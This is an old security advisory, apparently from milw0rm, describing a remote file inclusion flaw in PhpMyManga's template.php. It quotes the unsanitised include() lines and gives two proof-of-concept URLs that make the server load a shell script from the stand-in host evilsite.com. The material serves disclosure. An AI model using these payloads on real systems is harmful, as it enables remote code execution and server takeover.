@@ -1,0 +1,24 @@
++-------------------------------------------------------------------------------------------
++ PhpMyManga <= 0.8.1 (template.php) Multiple File Include Vulnerabilities
++-------------------------------------------------------------------------------------------
++ Affected Software .: PhpMyManga <= 0.8.1
++ Vendor ............: http://phpmanga.sourceforge.net/
++ Description .......: "PhpMyManga is a web-based application for cataloging your collection of mangas."
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ Input passed to the 'actionsPage' or 'formPage' parameter in template.php is not sanitized
++ before being used to include files.
++ 
++ Vulnerable Code:
++ template.php, line(s) 97-99: if (isSet($actionsPage)) { include($actionsPage); }
++ template.php, line(s)   115: include($formPage);
++ 
++ Proof Of Concept:
++ http://[target]/[path]/template.php?actionsPage=http://evilsite.com/shell.php?
++ http://[target]/[path]/template.php?formPage=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-10-16]
